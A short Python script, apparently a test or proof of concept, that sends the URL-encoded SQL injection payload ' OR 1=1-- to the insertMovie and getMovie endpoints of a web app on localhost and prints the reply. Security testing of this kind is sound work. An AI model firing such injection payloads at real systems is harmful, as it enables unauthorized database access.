import requests

port = "5000"
url = f"http://localhost:{port}"

payload = "%27OR%201%3D1--"

requests.get(url + "/insertMovie/" + payload)
r = requests.get(url + "/getMovie/" + payload)

print(r.text)